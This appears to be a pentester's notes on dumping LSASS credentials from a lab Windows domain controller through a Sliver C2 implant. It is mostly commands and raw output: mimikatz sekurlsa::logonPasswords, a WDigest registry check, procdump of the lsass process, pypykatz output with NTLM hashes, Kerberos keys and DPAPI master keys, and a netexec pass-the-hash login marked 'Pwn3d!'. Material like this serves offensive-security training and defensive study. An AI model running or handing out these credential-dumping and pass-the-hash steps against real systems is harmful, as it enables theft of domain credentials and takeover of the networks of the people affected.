
## Dumping LSASS


### Using inbuilt tools (not recommended)

```
hashdump
```


### Using mimikatz

```
sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "exit"
```

```
[server] sliver (RAINY_HAMMER) > sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "exit"

[*] Output:

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # exit
Bye!
```


If for some reason you cannot dump the lsass, then you should try using this command instead. if this doesnt work then congratulations. YOU GOT SKILL ISSUE'D

```
sideload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe "privilege::debug" "sekurlsa::logonPasswords"  "exit"
```
#### Checking access 

```
Authentication Id : 0 ; 694356 (00000000:000a9854)
Session           : Interactive from 1
User Name         : administrator
Domain            : MARVEL
Logon Server      : HYDRA-DC
Logon Time        : 4/18/2024 7:40:04 AM
SID               : S-1-5-21-3115080475-3422209674-2867084633-500
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : MARVEL
	 * NTLM     : 920ae267e048417fcfe00f49ecbd4b33   <---------------------------------- NTLM
	 * SHA1     : 980b0585a46a18e462561c0dd564fa1fef27f2bf
	 * DPAPI    : a6caf343c27abc8f6335a901228117bc
```

Checking the creds using hashes

```
kali@kali ~/vtools> nxc smb 192.168.78.129 -u 'Administrator' -H '920ae267e048417fcfe00f49ecbd4b33'
SMB         192.168.78.129  445    HYDRA-DC         [*] Windows Server 2022 Build 20348 x64 (name:HYDRA-DC) (domain:MARVEL.local) (signing:True) (SMBv1:False)
SMB         192.168.78.129  445    HYDRA-DC         [+] MARVEL.local\Administrator:920ae267e048417fcfe00f49ecbd4b33 (Pwn3d!) <--------------------------- NTLM
```

### Manually

Required;
- `RegKey WDigest = 1`
- `SeDebugPrivilege`
- Bypass UAC

### reg query WDigest

There is an almost limitless amount of recon activities we could perform, but lastly we will check the WDigest registry key. This key will allow for plaintext passwords to be kept in LSASS. We could set this once local admin as well, however the server needs a reboot for the setting to come into affect.

```
execute -o reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential
```


![[Pasted image 20240418200645.png]]

We can see below the output for that registry key is **1** this is the vulnerable setting and we should be able to get passwords in clear from LSASS dumps;

Interestingly for us is the assignment of ***SeDebugPrivilege*** which is required for dumping LSASS's process memory.

Use the built in procdump to dump the LSASS and then we can parse this out with mimikatz offline, Due to the **WDigest** registry key being set to 1 there is a good chance of plaintext passwords we can use further. We’ll start by using **ps** to list out all the Process ID (PID) values, we can then pass the LSASS PID to **procdump**

```
ps
```


```
[server] sliver (RAINY_HAMMER) > ps

 Pid    Ppid   Owner                  Arch     Executable                                  Session
====== ====== ====================== ======== =========================================== =========
 0      0                                      [System Process]                            -1
 4      0                             x86_64   System                                      0
 100    4                             x86_64   Registry                                    0
 288    4                             x86_64   smss.exe                                    0
 408    392                                    csrss.exe                                   -1
 476    468                                    csrss.exe                                   -1
 496    392                           x86_64   wininit.exe                                 0
 540    468                           x86_64   winlogon.exe                                1
 620    496                           x86_64   services.exe                                0
 640    496                           x86_64   lsass.exe                                   0   <------------------------------------ THIS IS WHAT WE WANT

```




```
kali@kali -> pypykatz lsa minidump /tmp/procdump_HYDRA-DC_640_236554994
INFO:pypykatz:Parsing file /tmp/procdump_HYDRA-DC_640_236554994
FILE: ======== /tmp/procdump_HYDRA-DC_640_236554994 =======
== LogonSession ==
authentication_id 1113010 (10fbb2)
session_id 0
username HYDRA-DC$
domainname MARVEL
logon_server
logon_time 2024-04-18T14:42:36.920658+00:00
sid S-1-5-18
luid 1113010
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.LOCAL

== LogonSession ==
authentication_id 327778 (50062)
session_id 0
username HYDRA-DC$
domainname MARVEL
logon_server
logon_time 2024-04-18T14:29:15.237933+00:00
sid S-1-5-18
luid 327778
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.LOCAL

== LogonSession ==
authentication_id 301472 (499a0)
session_id 0
username HYDRA-DC$
domainname MARVEL
logon_server
logon_time 2024-04-18T14:28:39.515410+00:00
sid S-1-5-18
luid 301472
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.LOCAL

== LogonSession ==
authentication_id 221750 (36236)
session_id 0
username HYDRA-DC$
domainname MARVEL
logon_server
logon_time 2024-04-18T14:28:25.669393+00:00
sid S-1-5-18
luid 221750
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.LOCAL

== LogonSession ==
authentication_id 203545 (31b19)
session_id 0
username HYDRA-DC$
domainname MARVEL
logon_server
logon_time 2024-04-18T14:28:12.803215+00:00
sid S-1-5-18
luid 203545
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.LOCAL

== LogonSession ==
authentication_id 67519 (107bf)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2024-04-18T14:27:28.410414+00:00
sid S-1-5-90-0-1
luid 67519
	== MSV ==
		Username: HYDRA-DC$
		Domain: MARVEL
		LM: NA
		NT: 000da82dd9ff3c760716ff02e5a926e5
		SHA1: 447d2f3081db73191161a388ee1ca1f552cb7e7a
		DPAPI: NA
	== WDIGEST [107bf]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.local
		Password: db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
		password (hex)db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
	== WDIGEST [107bf]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)

== LogonSession ==
authentication_id 67469 (1078d)
session_id 1
username DWM-1
domainname Window Manager
logon_server
logon_time 2024-04-18T14:27:28.410414+00:00
sid S-1-5-90-0-1
luid 67469
	== MSV ==
		Username: HYDRA-DC$
		Domain: MARVEL
		LM: NA
		NT: 000da82dd9ff3c760716ff02e5a926e5
		SHA1: 447d2f3081db73191161a388ee1ca1f552cb7e7a
		DPAPI: NA
	== WDIGEST [1078d]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.local
		Password: db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
		password (hex)db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
	== WDIGEST [1078d]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)

== LogonSession ==
authentication_id 996 (3e4)
session_id 0
username HYDRA-DC$
domainname MARVEL
logon_server
logon_time 2024-04-18T14:27:26.622144+00:00
sid S-1-5-20
luid 996
	== MSV ==
		Username: HYDRA-DC$
		Domain: MARVEL
		LM: NA
		NT: 000da82dd9ff3c760716ff02e5a926e5
		SHA1: 447d2f3081db73191161a388ee1ca1f552cb7e7a
		DPAPI: NA
	== WDIGEST [3e4]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)
	== Kerberos ==
		Username: hydra-dc$
		Domain: MARVEL.LOCAL
	== WDIGEST [3e4]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)

== LogonSession ==
authentication_id 47135 (b81f)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2024-04-18T14:27:26.029575+00:00
sid S-1-5-96-0-1
luid 47135
	== MSV ==
		Username: HYDRA-DC$
		Domain: MARVEL
		LM: NA
		NT: 000da82dd9ff3c760716ff02e5a926e5
		SHA1: 447d2f3081db73191161a388ee1ca1f552cb7e7a
		DPAPI: NA
	== WDIGEST [b81f]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.local
		Password: db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
		password (hex)db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
	== WDIGEST [b81f]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)

== LogonSession ==
authentication_id 694356 (a9854)
session_id 1
username administrator
domainname MARVEL
logon_server HYDRA-DC
logon_time 2024-04-18T14:40:04.099983+00:00
sid S-1-5-21-3115080475-3422209674-2867084633-500
luid 694356
	== MSV ==
		Username: Administrator
		Domain: MARVEL
		LM: NA
		NT: 920ae267e048417fcfe00f49ecbd4b33
		SHA1: 980b0585a46a18e462561c0dd564fa1fef27f2bf
		DPAPI: a6caf343c27abc8f6335a901228117bc
	== WDIGEST [a9854]==
		username Administrator
		domainname MARVEL
		password None
		password (hex)
	== Kerberos ==
		Username: administrator
		Domain: MARVEL.LOCAL
	== WDIGEST [a9854]==
		username Administrator
		domainname MARVEL
		password None
		password (hex)
	== DPAPI [a9854]==
		luid 694356
		key_guid 7e52ba17-5180-486c-94fa-9d87425b6a90
		masterkey 10af2bf1bbd6643253870f1bdd7549546999451cdfde9c3858b97ef1926301c0db0c4eb0e808cc03f47233306233d3fc71b9e3a07c423d379c8cf3294e76ff87
		sha1_masterkey a98edd198de3d071f055e91d3bd486bbb60a9054

== LogonSession ==
authentication_id 483244 (75fac)
session_id 0
username HYDRA-DC$
domainname MARVEL
logon_server
logon_time 2024-04-18T14:33:40.737212+00:00
sid S-1-5-18
luid 483244
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.LOCAL

== LogonSession ==
authentication_id 306071 (4ab97)
session_id 0
username HYDRA-DC$
domainname MARVEL
logon_server
logon_time 2024-04-18T14:28:41.169484+00:00
sid S-1-5-18
luid 306071
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.LOCAL

== LogonSession ==
authentication_id 305441 (4a921)
session_id 0
username HYDRA-DC$
domainname MARVEL
logon_server
logon_time 2024-04-18T14:28:41.001931+00:00
sid S-1-5-18
luid 305441
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.LOCAL

== LogonSession ==
authentication_id 301242 (498ba)
session_id 0
username HYDRA-DC$
domainname MARVEL
logon_server
logon_time 2024-04-18T14:28:39.482368+00:00
sid S-1-5-18
luid 301242
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.LOCAL

== LogonSession ==
authentication_id 214225 (344d1)
session_id 0
username HYDRA-DC$
domainname MARVEL
logon_server
logon_time 2024-04-18T14:28:21.997547+00:00
sid S-1-5-18
luid 214225
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.LOCAL

== LogonSession ==
authentication_id 997 (3e5)
session_id 0
username LOCAL SERVICE
domainname NT AUTHORITY
logon_server
logon_time 2024-04-18T14:27:28.652921+00:00
sid S-1-5-19
luid 997
	== Kerberos ==
		Username:
		Domain:

== LogonSession ==
authentication_id 47332 (b8e4)
session_id 1
username UMFD-1
domainname Font Driver Host
logon_server
logon_time 2024-04-18T14:27:26.091420+00:00
sid S-1-5-96-0-1
luid 47332
	== MSV ==
		Username: HYDRA-DC$
		Domain: MARVEL
		LM: NA
		NT: 000da82dd9ff3c760716ff02e5a926e5
		SHA1: 447d2f3081db73191161a388ee1ca1f552cb7e7a
		DPAPI: NA
	== WDIGEST [b8e4]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.local
		Password: db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
		password (hex)db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
	== WDIGEST [b8e4]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)

== LogonSession ==
authentication_id 47316 (b8d4)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2024-04-18T14:27:26.091420+00:00
sid S-1-5-96-0-0
luid 47316
	== MSV ==
		Username: HYDRA-DC$
		Domain: MARVEL
		LM: NA
		NT: 000da82dd9ff3c760716ff02e5a926e5
		SHA1: 447d2f3081db73191161a388ee1ca1f552cb7e7a
		DPAPI: NA
	== WDIGEST [b8d4]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.local
		Password: db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
		password (hex)db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
	== WDIGEST [b8d4]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)

== LogonSession ==
authentication_id 47158 (b836)
session_id 0
username UMFD-0
domainname Font Driver Host
logon_server
logon_time 2024-04-18T14:27:26.029575+00:00
sid S-1-5-96-0-0
luid 47158
	== MSV ==
		Username: HYDRA-DC$
		Domain: MARVEL
		LM: NA
		NT: 000da82dd9ff3c760716ff02e5a926e5
		SHA1: 447d2f3081db73191161a388ee1ca1f552cb7e7a
		DPAPI: NA
	== WDIGEST [b836]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)
	== Kerberos ==
		Username: HYDRA-DC$
		Domain: MARVEL.local
		Password: db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
		password (hex)db6cdea234b9f2be5a8762fd2f94330ac69e53ec072a67fa3103ed09fa8f8a0b6264c47c89a92576a1136f5d9014346867d2ad6a1e099b2fdc9a085eba55855b5a446c0559c7a3e9511d3c1ba695142b348221cbc64c85184623dc9b84f0399a430521522e28898518777c948fd04a50b0515d79f4de1914a02d85692b15e3bf5e8f9ba9a84f1626b15e0aed64648ac76327080f5a8c456337dc47a30f5a68446fc1a7cb25b21f8b35b70de3f9585e38dba7b7486cf9c3521bfed1feaba6eae1cd5b0e1fedb0d69e3eb973dbb4d545cecca897eee8817bedd12b2dd56f2750ce7d35855bdeb7fab07a4b4cf2f98d7574
	== WDIGEST [b836]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)

== LogonSession ==
authentication_id 44092 (ac3c)
session_id 0
username
domainname
logon_server
logon_time 2024-04-18T14:27:19.957236+00:00
sid None
luid 44092
	== MSV ==
		Username: HYDRA-DC$
		Domain: MARVEL
		LM: NA
		NT: 000da82dd9ff3c760716ff02e5a926e5
		SHA1: 447d2f3081db73191161a388ee1ca1f552cb7e7a
		DPAPI: NA

== LogonSession ==
authentication_id 999 (3e7)
session_id 0
username HYDRA-DC$
domainname MARVEL
logon_server
logon_time 2024-04-18T14:27:18.441557+00:00
sid S-1-5-18
luid 999
	== WDIGEST [3e7]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)
	== Kerberos ==
		Username: hydra-dc$
		Domain: MARVEL.LOCAL
	== WDIGEST [3e7]==
		username HYDRA-DC$
		domainname MARVEL
		password None
		password (hex)
	== DPAPI [3e7]==
		luid 999
		key_guid c3d4994b-2398-49a3-83d4-c97eaae9b014
		masterkey 0f6608c8476a6ddba2e85ba30d579f69a97dfb8797ef0902e3fe828892e997bf144ecfb32bfb21a70c2d8e1dd440650923225aaab58b60d3d180d0ba6de29900
		sha1_masterkey 91cdc721ddf746885739731b5ccd505a151487dc
	== DPAPI [3e7]==
		luid 999
		key_guid 1a58f124-06d5-4cc6-b3d5-ecd2be1f17c5
		masterkey 63240a9fe585f282d719f7d93b8cf6a8e760376d9d4b2a104d38ff899dbca27ec15d301777a8e0ca0e47b0459c66d4983bae2ba30e81e9978fbd004eb0d6314c
		sha1_masterkey f01712eeb274739c7ef1a016fa336c836336d9ed
	== DPAPI [3e7]==
		luid 999
		key_guid abe5191d-a94d-435f-9461-097dfcd2da76
		masterkey 03e3ef81a6ea7ad3342c33625d8da1d87f7872629a7ceb11fc3644059d197393f72c512c7ba7cac14493132607b28fe5b5638e94965cf3ac6e1055646340ec7b
		sha1_masterkey 2a1835f731a3b8c47d482d24a8847ec41fee9dd7
	== DPAPI [3e7]==
		luid 999
		key_guid f034ae08-c347-4bd9-9ad0-4b82f83d4ede
		masterkey 9cc1d4aba0688121129afd16486b389e1ef7a1877ee8a4d6932b87d680aedf65dd21ad651340392a4c38179d357ccc089bc99ad108c765e4d207125f5d865e8f
		sha1_masterkey d5b9d24ac7b13de522001f8db5e0383f156f3195

```






https://seamlessintelligence.com.au/sliver_2.html